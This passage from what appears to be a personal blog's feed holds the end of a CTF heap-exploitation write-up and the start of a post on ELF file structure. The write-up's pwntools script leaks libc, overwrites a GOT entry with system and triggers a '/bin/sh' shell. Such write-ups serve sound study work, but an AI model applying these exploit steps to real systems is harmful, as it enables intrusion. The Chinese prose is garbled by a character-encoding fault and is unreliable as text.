&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_addr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;puts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#gdb.attach(p)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;edit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;æ€»ç»“&quot;&gt;æ€»ç»“&lt;/h3&gt;
&lt;hr /&gt;
&lt;ol&gt;
  &lt;li&gt;å®ç°ä»»æ„å†™ä¸ä¸€å®šè€æ˜¯æƒ³ç€double freeå•¥çš„æ„é€ åŒé“¾è¡¨ï¼Œåªè¦æœ‰åŒæŒ‡é’ˆå¥½åƒéƒ½å¯ä»¥&lt;/li&gt;
  &lt;li&gt;æ³¨æ„fastbinçš„LIFOç‰¹æ€§ï¼Œå¾€å¾€ååˆ†é…çš„chunké€ æˆçš„overflowå¯ä»¥overwriteå…ˆåˆ†é…çš„chunk&lt;/li&gt;
  &lt;li&gt;ä¸€å®šè¦è®°å¾—æˆ‘ä»¬çš„ç»ˆæç›®æ ‡ï¼Œæ— éæ˜¯ä»»æ„è¯»å’Œä»»æ„å†™ï¼Œè¿˜æ˜¯è¦é åˆ·é¢˜ç§¯ç´¯å¥—è·¯â€¦&lt;/li&gt;
&lt;/ol&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="pwn" /><category term="HeapExploit" /><summary type="html">â€ƒâ€ƒåˆ·é¢˜è¿‡å°‘ï¼Œå¯¼è‡´çœ‹èµ·æ¥ååˆ†ç®€å•çš„é¢˜ç›®å½“æ—¶æ— ä»ä¸‹æ‰‹ã€‚æ²¡åŠæ³•ï¼Œè¿˜æ˜¯è¦å¤šåˆ·é¢˜æ‰¾æ‰‹æ„Ÿã€‚ä»Šå¤©æƒ³èµ·æ¥ä¸Šæ¬¡easyheapæ²¡æ•´ç†ï¼Œè¶æœºå­¦ä¹ ä¸€æ³¢ï¼Œçœ‹äº†ä¸€ä¸‹æ€è·¯ï¼Œæœç„¶æ²¡ä»€ä¹ˆæ–°çš„åˆ©ç”¨ç‚¹ï¼Œå°±æ˜¯å½“æ—¶æ¼æ´ç‚¹æ²¡å‘ç°ã€‚</summary></entry><entry><title type="html">ELFç›¸å…³çŸ¥è¯†</title><link href="http://localhost:4000/blog/ELF%E6%80%BB%E7%BB%93" rel="alternate" type="text/html" title="ELFç›¸å…³çŸ¥è¯†" /><published>2020-03-18T00:00:00+08:00</published><updated>2020-03-18T00:00:00+08:00</updated><id>http://localhost:4000/blog/ELF%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/blog/ELF%E6%80%BB%E7%BB%93">&lt;p&gt;æœ€è¿‘ä¸€ä¸ªæœˆå­¦äº†ä¸€äº›é›¶æ•£çš„çŸ¥è¯†ï¼Œæœ¬æ¥åœ¨å­¦ä¹ æ“ä½œç³»ç»Ÿç›¸å…³ï¼Œæƒ³å¯¹ç€æ¸…åçš„ucoreè‡ªå·±æ“ä½œä¸€ä¸‹ï¼Œç»“æœbootloaderæ²¡æœ‰è¾¾åˆ°ç†æƒ³çš„æ•ˆæœã€‚
ç„¶åzxyåŒå­¦æ‹‰æˆ‘å»æä¸ªæ¯”èµ›ï¼Œè¦æ±‚å®ç°ä¸€ä¸ªå¯¹ELFç­¾åçš„å·¥å…·ï¼Œæœ€åè¦å†™ä¸€ä¸ªå†…æ ¸æ¨¡å—å»hookç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚æœç­¾åéªŒè¯é€šè¿‡å°±å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™
ä¸èƒ½æ‰§è¡Œã€‚æˆ‘çš„æ€è·¯å¤§è‡´æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç†Ÿæ‚‰openssl,å®ç°åŸºæœ¬RSAç­¾å&lt;/li&gt;
  &lt;li&gt;å®ŒæˆELFæ–‡ä»¶è¯»å†™æ¨¡å—ï¼Œèƒ½å¤Ÿæ–°å»ºä¸€ä¸ªsectionï¼Œå¹¶å°†signæ’å…¥å…¶ä¸­&lt;/li&gt;
  &lt;li&gt;èƒ½è¯».text section,å¹¶å¯¹å…¶ç­¾å&lt;/li&gt;
  &lt;li&gt;å®Œæˆè¯ä¹¦ç›¸å…³çš„ç­¾å&lt;/li&gt;
  &lt;li&gt;å†…æ ¸æ¨¡å—çš„å¼€å‘&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç›®å‰æˆ‘å·²ç»åŸºæœ¬å®Œæˆäº†ç¬¬ä¸‰æ­¥ï¼Œé‡åˆ°çš„ä¸»è¦å›°éš¾æœ‰ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;opensslçš„æ–‡æ¡£è¿‡äºåƒåœ¾ï¼Œä¸çŸ¥é“æ€ä¹ˆç”¨&lt;/li&gt;
  &lt;li&gt;ELFæ–‡ä»¶çš„è§£æï¼Œéœ€è¦ååˆ†ç†Ÿæ‚‰å…¶ç»“æ„&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å½“ç„¶å¯ä»¥é¢„çŸ¥å†…æ ¸æ¨¡å—è‚¯å®šä¹Ÿä¸å¥½åŠï¼Œæˆ‘ä¹‹å‰éƒ½æ²¡æœ‰æ¥è§¦è¿‡ã€‚ä¸‹é¢ä¸»è¦æ•´ç†ä¸€ä¸‹ELFç›¸å…³çš„çŸ¥è¯†ï¼Œä»¥åŠç»™ELFæ–‡ä»¶æ·»åŠ ä¸€ä¸ªsectionçš„æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h3 id=&quot;elfç›¸å…³&quot;&gt;ELFç›¸å…³&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆç»™ä¸€ä¸ªELFæ–‡ä»¶çš„ç»“æ„å›¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/object_file_format.png&quot; alt=&quot;object_file_format.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ELFæ–‡ä»¶æœ‰ä¸¤ç§è§†å›¾ï¼Œä¸€ç§æ˜¯é“¾æ¥ç‰ˆï¼Œä¸€ç§æ˜¯æ‰§è¡Œç‰ˆã€‚é“¾æ¥ç‰ˆä¸»è¦ç”±sectionæ„æˆï¼Œè¿è¡Œç‰ˆåˆ™ä¸»è¦æœ‰segmentæ„æˆã€‚é‚£ä¹ˆsectionå’Œsegmentçš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ
å®é™…ä¸Šsegmentç”±sectionæ„æˆï¼Œåœ¨æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­åï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„data segmentï¼Œcode segmentä¹‹ç±»çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¸»è¦å…³å¿ƒsectionç›¸å…³çš„ç»“æ„ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒELFæ–‡ä»¶ç”±ELF Headerï¼Œprogram Headerï¼Œsectionï¼Œsection Headeræ„æˆã€‚å½“ç„¶é“¾æ¥è§†å›¾ä¸­ï¼Œprogram headeræ˜¯å¯é€‰çš„ï¼Œå› ä¸ºä»–ä¸»è¦ç”¨äºå‘Šè¯‰ç³»ç»Ÿå¦‚ä½•åˆ›å»ºè¿›ç¨‹ã€‚ç”¨äºç”Ÿæˆè¿›ç¨‹çš„ç›®æ ‡æ–‡ä»¶å¿…é¡»å…·æœ‰ç¨‹åºå¤´éƒ¨è¡¨ï¼Œä½†æ˜¯é‡å®šä½æ–‡ä»¶ä¸éœ€è¦è¿™ä¸ªè¡¨ã€‚ä¸‹é¢ç»™ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„å›¾ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://pic.dyf.ink/elf-layout.png&quot; alt=&quot;elf-layout.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°program headerä¸»è¦å’Œsegmentæœ‰å…³ï¼Œsection headeråˆ™å­˜å‚¨äº†æ¯ä¸ªsectionç›¸å…³çš„è¡¨é¡¹ã€‚è€ŒELF headeråˆ™å­˜å‚¨äº†ELFçš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚ä»£ç æ®µå…¥å£ï¼Œsectionçš„æ•°ç›®ï¼Œsection headerçš„offsetä¹‹ç±»çš„ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define EI_NIDENT   16
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;e_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EI_NIDENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// æ ‡å¿—ç¬¦&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_machine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Addr&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e_phoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_ehsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_phentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_phnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Half&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Elf32_Ehdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯ELF Headerçš„ç»“æ„ä½“,è¿™ä¸ªç»“æ„ä½“ä¸€èˆ¬å­˜å‚¨äº†ELFæ–‡ä»¶çš„å…³é”®ä¿¡æ¯ï¼Œé€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf -h a&lt;/code&gt;æ¥æŸ¥çœ‹ä¸€ä¸ªELFæ–‡ä»¶çš„å¤´ï¼Œå…¶å®ç†Ÿæ‚‰ä¹‹åç›´æ¥&lt;code class=&quot;highlighter-rouge&quot;&gt;xxd a&lt;/code&gt;æ‰‹æ’•16è¿›åˆ¶å°±è¡Œäº†ï¼ˆé€ƒâ€¦é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥éšä¾¿ä¸¾ä¸ªæ —å­ï¼š&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Aurora:/home/code/solo/rubbish/hardwork/casual&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;masterâš¡&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# readelf -h a   &lt;/span&gt;
ELF å¤´ï¼š
  Magicï¼š  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  ç±»åˆ«:                              ELF32
  æ•°æ®:                              2 è¡¥ç ï¼Œå°ç«¯åº &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;little endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Version:                           1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  OS/ABI:                            UNIX - System V
  ABI ç‰ˆæœ¬:                          0
  ç±»å‹:                              DYN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;å…±äº«ç›®æ ‡æ–‡ä»¶&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  ç³»ç»Ÿæ¶æ„:                          Intel 80386
  ç‰ˆæœ¬:                              0x1
  å…¥å£ç‚¹åœ°å€ï¼š              0x1060
  ç¨‹åºå¤´èµ·ç‚¹ï¼š              52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes into file&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Start of section headers:          14328 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes into file&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  æ ‡å¿—ï¼š             0x0
  Size of this header:               52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Size of program headers:           32 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Number of program headers:         11
  Size of section headers:           40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Number of section headers:         30
  Section header string table index: 29
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªååˆ†ç®€å•çš„hello worldç¨‹åºï¼Œå†æ¥ä¸‹æ¥ç»™å‡ºå‰0x80ä¸ªå­—èŠ‚çš„hexdumpï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-hex&quot;&gt;00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 0300 0100 0000 6010 0000 3400 0000  ........`...4...
00000020: f837 0000 0000 0000 3400 2000 0b00 2800  .7......4. ...(.
00000030: 1e00 1d00 0600 0000 3400 0000 3400 0000  ........4...4...         // å…¶å®ELF Headeråˆ°0x33å³(1d00)çš„æ—¶å€™å°±ç»“æŸäº†
00000040: 3400 0000 6001 0000 6001 0000 0400 0000  4...`...`.......
00000050: 0400 0000 0300 0000 9401 0000 9401 0000  ................
00000060: 9401 0000 1300 0000 1300 0000 0400 0000  ................
00000070: 0100 0000 0100 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 bc03 0000 bc03 0000 0400 0000  ................
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™é‡Œæ˜¯&lt;code class=&quot;highlighter-rouge&quot;&gt;readelf -S -W a&lt;/code&gt;çš„æœ«å°¾ç»“æœï¼š&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[24] .data             PROGBITS        00004014 003014 000008 00  WA  0   0  4
[25] .bss              NOBITS          0000401c 00301c 000004 00  WA  0   0  1
[26] .comment          PROGBITS        00000000 00301c 000026 01  MS  0   0  1
[27] .symtab           SYMTAB          00000000 003044 000450 10     28  45  4
[28] .strtab           STRTAB          00000000 003494 00025c 00      0   0  1
[29] .shstrtab         STRTAB          00000000 0036f0 000105 00      0   0  1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åœ¨è¿™é‡Œä¸æƒ³å¤ªæ·±å…¥çš„ä»‹ç»æ¯ä¸ªå­—æ®µä»£è¡¨çš„è¯¦ç»†æ„ä¹‰ï¼Œå…·ä½“è¯·å‚è€ƒ&lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/executable/elf/elf-structure-zh/&quot;&gt;ctf-wiki&lt;/a&gt;æˆ–è€…é˜…è¯»ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹è¿™æœ¬ä¹¦ï¼Œå†…å®¹ååˆ†è¯¦ç»†ï¼Œæˆ‘ä»¬è¿™é‡Œåªå¸¦å¤§å®¶å¤ä¹ ä¸€äº›æ¯”è¾ƒé‡è¦çš„å­—æ®µã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;e_shoff&lt;/strong&gt;&lt;br /&gt;
  è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨åœ¨æ–‡ä»¶ä¸­çš„å­—èŠ‚åç§»ï¼ˆ Section Header table OFFset ï¼‰å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™ä¸º 0&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;e_shentsize&lt;/strong&gt;&lt;br /&gt;
  è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´çš„å­—èŠ‚é•¿åº¦ï¼ˆSection Header ENTry SIZEï¼‰ã€‚ä¸€ä¸ªèŠ‚å¤´æ˜¯èŠ‚å¤´è¡¨ä¸­çš„ä¸€é¡¹ï¼›èŠ‚å¤´è¡¨ä¸­æ‰€æœ‰é¡¹å æ®çš„ç©ºé—´å¤§å°ç›¸åŒã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;e_shnum&lt;/strong&gt; &lt;br /&gt;
  è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­çš„é¡¹æ•°ï¼ˆSection Header NUMberï¼‰ã€‚å› æ­¤ï¼Œ e_shnum ä¸ e_shentsize çš„ä¹˜ç§¯å³ä¸ºèŠ‚å¤´è¡¨çš„å­—èŠ‚é•¿åº¦ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚å¤´è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸º 0ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;e_shstrndx&lt;/strong&gt; &lt;br /&gt;
  è¿™ä¸€é¡¹ç»™å‡ºèŠ‚å¤´è¡¨ä¸­ä¸èŠ‚åå­—ç¬¦ä¸²è¡¨ç›¸å…³çš„è¡¨é¡¹çš„ç´¢å¼•å€¼ï¼ˆSection Header table InDeX related with section name STRing tableï¼‰ã€‚å¦‚æœæ–‡ä»¶ä¸­æ²¡æœ‰èŠ‚åå­—ç¬¦ä¸²è¡¨ï¼Œåˆ™è¯¥é¡¹å€¼ä¸ºSHN_UNDEFã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å‘ELFä¸­æ’å…¥ä¸€ä¸ªsectionï¼Œé‚£ä¹ˆé¦–å…ˆè¦æ¸…æ¥šELFæ˜¯æ€ä¹ˆå­˜å‚¨å¹¶è¯†åˆ«sectionçš„ï¼ŒæŒ‰ç…§å¼€å‘è€…çš„æ€è·¯ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°æˆ‘ä»¬å¯ä»¥æŠŠæ¯ä¸ªsectionçš„ä¿¡æ¯å’Œç‰¹å¾æŠ½è±¡æˆä¸€ä¸ªstructï¼Œç„¶åæŠŠæ‰€æœ‰çš„structå­˜å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæœ€åæŠŠæ•°ç»„çš„åœ°å€æ”¾å…¥ELF Headerå°±å¯ä»¥äº†ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é€šè¿‡ELF Headeræ¥è·å¾—section structæ•°ç»„ï¼Œè¿›è€Œé—´æ¥è·å¾—sectionçš„ä¿¡æ¯ã€‚å…¶å®ä¸Šé¢è¿™å‡ ä¸ªå­—æ®µçš„ä½œç”¨ä¾¿æ˜¯å¦‚æ­¤ã€‚å­˜å‚¨structçš„æ•°ç»„å°±æ˜¯ä¸Šé¢æåˆ°çš„Section Header Tableï¼Œåœ¨ELFæ–‡ä»¶çš„æœ«å°¾ã€‚&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²sectionï¼Œä»–å­˜å‚¨äº†æ‰€æœ‰sectionçš„åå­—ï¼ŒELF Headerä¸­çš„&lt;code class=&quot;highlighter-rouge&quot;&gt;e_shstrndx&lt;/code&gt;ä¾¿æ˜¯å…¶åœ¨Section Header Tableä¸­çš„ç´¢å¼•ï¼Œå› æ­¤æƒ³è¦è·å¾—&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;çš„çœŸæ˜¯åç§»æˆ‘ä»¬åªéœ€è¦æŒ‰å¦‚ä¸‹å…¬å¼è®¡ç®—:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shstrtabOff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shstrndx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e_shentsize&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// åŸºå€ + ç´¢å¼• Ã— å¤§å°&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é‚£æ€ä¹ˆè·å¾—section nameåœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;.shstrtab&lt;/code&gt;ä¸­çš„å…·ä½“åç§»å‘€ï¼Ÿå…¶å®section structçš„çœŸæ˜¯åå­—å«Elf32_Shdr(32ä½)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Addr&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Off&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_link&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ELF32_Word&lt;/span&gt;      &lt;span class=&quot;n&quot;&gt;sh_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
